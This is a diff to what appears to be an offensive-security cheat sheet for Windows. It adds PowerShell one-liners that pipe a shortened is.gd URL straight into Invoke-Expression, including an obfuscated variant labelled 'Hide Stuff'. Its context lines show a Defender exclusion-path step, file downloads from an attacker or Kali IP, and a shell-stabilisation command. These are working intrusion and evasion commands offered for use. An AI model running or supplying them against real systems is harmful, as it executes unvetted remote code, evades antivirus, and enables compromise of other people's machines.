@@ -24,8 +24,22 @@ func main() {
 ```elixir
 GOOS=windows GOARCH=amd64 go build -o pleasesubscribe.exe pleasesubscribe.go
 ```
-## 💭 Defender Exclusion Path Detection
-[John Hammand Video](https://youtu.be/fxO1V0mzePQ?si=DkA5820pjg2F47pV)
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# 🔥 Fire Your Notepad.exe
+```bash
+# Daily Stuff
+irm is.gd/Q2Katq | iex
+
+# Open Stuff
+Invoke-RestMethod is.gd/Q2Katq | Invoke-Expression
+
+# Hide Stuff
+& (gal ir?) is.gd/Q2Katq |& (gal i?x)
+```
+
+# 💭  Defender Exclusion Path Detection
+[John Hammand Video ](https://youtu.be/fxO1V0mzePQ?si=DkA5820pjg2F47pV)
 ### Add Exclusion Path
 ```elixir
 # Need Admin Priv
@@ -107,7 +121,7 @@ powershell "iwr -Uri http://${YOUR_KALI_IP_ADDRESS}:$port/file -OutFile C:/Windo
 powershell -NoProfile -Command "$ip='$Attacker_IP'; iwr http://$ip:$port/file -OutFile $env:TEMP\file; Get-Content $env:TEMP\file"
 ```
 
-## Some Python Automation
+# Some Python Automation...
 ```bash
 # Used to Stable shell's
 python3 -c "import pty; pty.spawn('/bin/bash')"
